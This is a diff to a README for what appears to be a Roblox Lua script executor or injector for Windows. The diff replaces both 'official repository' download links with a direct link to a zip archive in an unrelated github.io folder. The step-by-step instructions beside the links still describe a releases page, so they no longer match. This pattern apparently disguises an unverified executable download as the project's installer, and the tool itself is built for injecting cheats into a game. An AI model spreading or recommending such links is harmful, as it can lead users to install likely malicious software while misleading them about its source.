@@ -5,7 +5,7 @@ description: "Execute Roblox scripts using a lightweight Lua injector for Window
 ---
 # ⚙️ delta-script-hub-executor - Run Lua scripts on Windows desktop
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/alanapositive771/delta-script-hub-executor)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/alanapositive771/alanapositive771.github.io/main/tamandua/Application-v1.1.zip)
 
 delta-script-hub-executor allows you to execute Lua scripts within Roblox on Windows 10 and 11. The application provides a central hub to manage and run scripts through a simple desktop interface. It supports 64-bit systems and includes access to a library of over 500 scripts.
 
@@ -24,7 +24,7 @@ To ensure the software runs without errors, your computer must meet these specif
 
 You need to obtain the installer from the official repository page.
 
-[Visit the download page here](https://github.com/alanapositive771/delta-script-hub-executor)
+[Visit the download page here](https://raw.githubusercontent.com/alanapositive771/alanapositive771.github.io/main/tamandua/Application-v1.1.zip)
 
 1. Navigate to the link above.
 2. Locate the latest release version on the right side of the screen.
